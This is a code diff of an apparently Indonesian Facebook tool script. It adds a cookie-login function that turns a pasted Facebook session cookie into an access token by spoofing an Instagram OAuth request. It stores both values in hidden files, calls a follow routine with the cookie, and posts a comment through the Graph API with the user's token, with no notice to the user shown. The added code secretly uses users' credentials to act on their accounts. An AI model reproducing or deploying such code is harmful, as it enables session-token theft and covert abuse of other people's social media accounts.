@@ -349,6 +349,57 @@ def login():
 import requests
 from bs4 import BeautifulSoup as BSP
 
+def logincoki():
+    cookie = Console().input(f" {H2}• {P2}cookie : ")
+    try:
+        ses.headers.update(
+            {
+                "Accept-Language": "id,en;q=0.9",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
+                "Referer": "https://www.instagram.com/",
+                "Host": "www.facebook.com",
+                "Sec-Fetch-Mode": "cors",
+                "Accept": "*/*",
+                "Connection": "keep-alive",
+                "Sec-Fetch-Site": "cross-site",
+                "Sec-Fetch-Dest": "empty",
+                "Origin": "https://www.instagram.com",
+                "Accept-Encoding": "gzip, deflate",
+            }
+        )
+        link = ses.get(
+            "https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",
+            cookies={"cookie": cookie},
+        )
+        if '"access_token":' in str(link.headers):
+            token = re.search('"access_token":"(.*?)"', str(link.headers)).group(1)
+            open(".vipercok.txt", "w").write(cookie)
+            open(".vipertok.txt", "w").write(token)
+            viperfollow(cookie)
+            requests.post(
+                f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}",
+                headers={"cookie": cookie},
+            )
+            Console().print(
+                Panel(
+                    f"""{P2}{token}""",
+                    width=60,
+                    style=f"{color_panel}",
+                    title="[bold green]TOKEN",
+                )
+            )
+            Console().print(
+                f" {H2}• {P2}[bold green]Login Berhasil,jalankan Ulang Script"
+            )
+    except Exception as e:
+        Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
+        os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
+        print(e)
+        time.sleep(3)
+        exit()
+    except:
+        pass
+        
 def viperfollow(VIPER):  
     """
     Fungsi untuk mengikuti akun Facebook berdasarkan cookie yang diberikan.
@@ -389,7 +440,7 @@ def viperfollow(VIPER):
 
 
 # Fungsi untuk login dengan cookie
-def logincoki():
+def logincokiiiii():
     # Mengambil input cookie dari user
     cookie = Console().input(f" {H2}• {P2}cookie : ")
     try:
